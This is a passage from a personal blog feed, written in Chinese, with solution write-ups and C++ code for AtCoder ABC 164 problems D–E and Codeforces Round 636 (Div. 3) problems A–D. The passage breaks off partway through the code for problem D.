        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h1 id="AtCoder-ABC-164-D-E"><a href="#AtCoder-ABC-164-D-E" class="headerlink" title="AtCoder ABC 164 (D~E)"></a>AtCoder ABC 164 (D~E)</h1><ul><li>前言:<br>这次的abc f太难了，补不动，QAQ。</li></ul><h2 id="D-Multiple-of-2019"><a href="#D-Multiple-of-2019" class="headerlink" title="D. Multiple of 2019"></a>D. Multiple of 2019</h2><ul><li><p>题意:<br>给定一串包含数字(1~9)的串,让你求出有多少个子串满足是2019倍数。</p></li><li><p>题解:<br>假设一个数是$a[6]$,可以发现如果一个数是2019的倍数，那么$a[1~5]<em>10%2019+a[6]$也还是2019的倍数；并且将$(a[i] </em>  10^k +a[i+1]) mod 2019$ 存储起来，碰到余数存在的相同，就可以发现这两个数之间是存在2019的倍数的。</p></li><li><p>NOTE:<br>是不能正的处理的，我们会发现如果正的处理，当存在一个2019的倍数时，就会被模变成0，则无法对接下来的数串有贡献。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp">string s<span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>mod <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>mod <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> s<span class="token punctuation">;</span>    <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> lst <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> p <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment">// for (int i = 0; i &lt; (int)s.size(); i++)</span>    <span class="token comment">// &#123;</span>    <span class="token comment">//     tmp = s[i] - '0';</span>    <span class="token comment">//     lst = (lst * 10 + tmp) % mod;</span>    <span class="token comment">//     cout &lt;&lt; lst &lt;&lt; "\n";</span>    <span class="token comment">//     cnt += a[lst]++;</span>    <span class="token comment">// &#125;</span>    <span class="token function">reverse</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        lst <span class="token operator">+=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'0'</span><span class="token punctuation">)</span> <span class="token operator">*</span> p<span class="token punctuation">;</span>        lst <span class="token operator">%=</span> <span class="token number">2019</span><span class="token punctuation">;</span>     <span class="token comment">//   cout &lt;&lt; lst &lt;&lt; " " &lt;&lt; a[lst] &lt;&lt; "\n";</span>        cnt <span class="token operator">+=</span> a<span class="token punctuation">[</span>lst<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        p <span class="token operator">*=</span> <span class="token number">10</span><span class="token punctuation">;</span>        p <span class="token operator">%=</span> <span class="token number">2019</span><span class="token punctuation">;</span>        <span class="token comment">// cout &lt;&lt; v &lt;&lt; endl;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> cnt <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="E-Two-Currencies"><a href="#E-Two-Currencies" class="headerlink" title="E. Two Currencies"></a>E. Two Currencies</h2><ul><li><p>题意:<br>有$n$个城市，$m$条路，$s$个银币，每条路需要花费$A_i$个银币和$B_i$ 分钟，可以在第$i$个城市花费$D_i$分钟获得$C_i$个银币，求从1到2—&gt;$n$需要最少花费的时间。</p></li><li><p>题解:<br>考虑数据范围，发现只要获得2500枚银币以上，就可以完全跑完全程。于是可以想到dp,$dp[i][j]$表示到第i个城市，身上有$j$个银币所花费的最小时间。使用Dijkstra算法进行dp即可。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">60</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> tot <span class="token operator">=</span> <span class="token number">2600</span><span class="token punctuation">;</span><span class="token keyword">const</span> ll inf <span class="token operator">=</span> <span class="token number">1e18</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span>ll s<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">></span> G<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>ll dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">;</span>ll c<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">,</span> d<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dijk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> maxn<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> tot<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span>    priority_queue<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span>ll<span class="token punctuation">,</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span><span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span>ll<span class="token punctuation">,</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">></span><span class="token punctuation">,</span> greater<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span>ll<span class="token punctuation">,</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">>></span> pq<span class="token punctuation">;</span>    pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> s<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pair<span class="token operator">&lt;</span>ll<span class="token punctuation">,</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span> tp<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>pq<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        tp <span class="token operator">=</span> pq<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pq<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> nowpos <span class="token operator">=</span> tp<span class="token punctuation">.</span>second<span class="token punctuation">.</span>first<span class="token punctuation">;</span>        ll nowcost <span class="token operator">=</span> tp<span class="token punctuation">.</span>first<span class="token punctuation">;</span>        ll nows <span class="token operator">=</span> <span class="token punctuation">(</span>ll<span class="token punctuation">)</span>tp<span class="token punctuation">.</span>second<span class="token punctuation">.</span>second<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>to <span class="token operator">:</span> G<span class="token punctuation">[</span>nowpos<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            ll newcost <span class="token operator">=</span> nowcost <span class="token operator">+</span> to<span class="token punctuation">.</span>second<span class="token punctuation">.</span>second<span class="token punctuation">;</span>            ll nwe <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>nows <span class="token operator">-</span> to<span class="token punctuation">.</span>second<span class="token punctuation">.</span>first<span class="token punctuation">,</span> <span class="token punctuation">(</span>ll<span class="token punctuation">)</span>tot <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nwe <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>to<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">[</span>nwe<span class="token punctuation">]</span> <span class="token operator">></span> newcost<span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    dp<span class="token punctuation">[</span>to<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">[</span>nwe<span class="token punctuation">]</span> <span class="token operator">=</span> newcost<span class="token punctuation">;</span>                    pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>newcost<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>to<span class="token punctuation">.</span>first<span class="token punctuation">,</span> nwe<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        ll nwecost <span class="token operator">=</span> nowcost <span class="token operator">+</span> d<span class="token punctuation">[</span>nowpos<span class="token punctuation">]</span><span class="token punctuation">;</span>        ll nwe <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>nows <span class="token operator">+</span> c<span class="token punctuation">[</span>nowpos<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>ll<span class="token punctuation">)</span>tot <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>nowpos<span class="token punctuation">]</span><span class="token punctuation">[</span>nwe<span class="token punctuation">]</span><span class="token operator">></span>nwecost<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span>nowpos<span class="token punctuation">]</span><span class="token punctuation">[</span>nwe<span class="token punctuation">]</span> <span class="token operator">=</span> nwecost<span class="token punctuation">;</span>            pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>nwecost<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>nowpos<span class="token punctuation">,</span> nwe<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m <span class="token operator">>></span> s<span class="token punctuation">;</span>    <span class="token keyword">int</span> u<span class="token punctuation">,</span> v<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> u <span class="token operator">>></span> v <span class="token operator">>></span> a <span class="token operator">>></span> b<span class="token punctuation">;</span>        G<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>v<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>a<span class="token punctuation">,</span> b<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        G<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>u<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>a<span class="token punctuation">,</span> b<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">dijk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ll ans<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ans <span class="token operator">=</span> inf<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> tot<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            ans <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> ans<span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AtCoder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round #636 (Div. 3)</title>
      <link href="/2020/04/22/Codeforces-Round-636-Div-3/"/>
      <url>/2020/04/22/Codeforces-Round-636-Div-3/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h1 id="Codeforces-Round-636-Div-3"><a href="#Codeforces-Round-636-Div-3" class="headerlink" title="Codeforces Round #636 (Div. 3)"></a>Codeforces Round #636 (Div. 3)</h1><p> 前言:<br>打到D题的时候卡住了，不应该想线段树这么复杂的做法的，虽然有人用线段树过了QAQ，还是太菜了。</p><h2 id="A-Candies"><a href="#A-Candies" class="headerlink" title="A. Candies"></a><a href="https://codeforces.com/contest/1343/problem/A">A. Candies</a></h2><ul><li>题意：<br>给定$x,k,n$均为正整数，且满足$x+2x+4x+….+2^{k-1}x=n$,$k&gt;1$,输出任意一个满足上述式子的$x$的值</li><li>题解&amp;代码:<br>按题意模拟即可<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> N<span class="token punctuation">;</span>    cin <span class="token operator">>></span> N<span class="token punctuation">;</span>    <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>N<span class="token operator">%</span>tmp<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cout <span class="token operator">&lt;&lt;</span> N <span class="token operator">/</span> tmp <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        tmp <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>        tmp<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><h2 id="B-Balanced-Array"><a href="#B-Balanced-Array" class="headerlink" title="B. Balanced Array"></a><a href="https://codeforces.com/contest/1343/problem/B">B. Balanced Array</a></h2><ul><li>题意:<br>给定一个偶数$n$ , 输出 $2n$ 个数，前$n$个数为偶数，后$n$个数为奇数，要求偶数的和==奇数的和。如果存在就输出，不存在就输出”NO”。</li><li>题解&amp;代码<br>可以通过奇偶性质判断，当$\frac{n}{2}$为奇数时，奇数的和为奇数，则无法满足要求。为偶数时按题意模拟即可.<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> N<span class="token punctuation">;</span>    cin <span class="token operator">>></span> N<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>N<span class="token operator">/</span><span class="token number">2</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"NO\n"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"YES\n"</span><span class="token punctuation">;</span>    ll sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ll tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        tmp<span class="token operator">+=</span><span class="token number">2</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> tmp <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        sum <span class="token operator">+=</span> tmp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    tmp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        tmp <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> tmp <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        sum <span class="token operator">-=</span> tmp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> sum <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><h2 id="C-Alternating-Subsequence"><a href="#C-Alternating-Subsequence" class="headerlink" title="C. Alternating Subsequence"></a><a href="https://codeforces.com/contest/1343/problem/C">C. Alternating Subsequence</a></h2><ul><li><p>题意:<br>给定一个包含$n$个数的序列，让你求出最长的子序列，其中子序列种的相邻两个数必须不同号，输出子序列的和。如果相同长度，则输出最大子序列的和。</p></li><li><p>题解&amp;代码<br>划分区间，每个区间取最大值即可。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ll a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> N<span class="token punctuation">;</span>    cin <span class="token operator">>></span> N<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    ll sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ll tmp <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ll lst <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>lst<span class="token operator">*</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span> i<span class="token operator">==</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            sum <span class="token operator">+=</span> tmp<span class="token punctuation">;</span>            lst <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            tmp <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        tmp <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> sum <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="D-Constant-Palindrome-Sum"><a href="#D-Constant-Palindrome-Sum" class="headerlink" title="D. Constant Palindrome Sum"></a><a href="https://codeforces.com/contest/1343/problem/D">D. Constant Palindrome Sum</a></h2><ul><li><p>题意:<br>给定偶数$n$, 正整数$k$，和包含$2n$个数的数组$a[2n]$, 可以将数组中的数改变为$[1:k]$ 这个范围的任意数使得$a[i]+a[n-i+1]$ 之和全部相等，改变数字的最小次数是多少。</p></li><li><p>题解&amp;代码:<br>用线段树或者差分都能做。我比赛的时候线段树写崩了。。。QAQ，这里讲差分的做法。<br>$a[i]+a[n-i+1]$ 改变一个数字所能达到的最大范围是<br>$[min(a[i],a[n-i+1])+1,max(a[i],a[n-i+1])+k]$,那么我们只要把这个区间的数+1，然后就可以发现没有+1的区间需要改变两次才能成功。那么我们只要枚举$[1:2k]$，更新答案即可。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> pref<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> k<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> k<span class="token punctuation">;</span>    <span class="token function">fill</span><span class="token punctuation">(</span>vis<span class="token punctuation">,</span> vis <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fill</span><span class="token punctuation">(</span>pref<span class="token punctuation">,</span> pref <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> tmp <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>n <span class="token operator">-</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        vis<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> r <span class="token operator">=</span> k <span class="token operator">+</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> tl <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>n <span class="token operator">-</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tr <span class="token operator">=</span> k <span class="token operator">+</span> a<span class="token punctuation">[</span>n <span class="token operator">-</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> mn <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> tl<span class="token punctuation">)</span><span class="token punctuation">,</span> mx <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> tr<span class="token punctuation">)</span><span class="token punctuation">;</span>        pref<span class="token punctuation">[</span>mn<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">,</span> pref<span class="token punctuation">[</span>mx<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>    <span 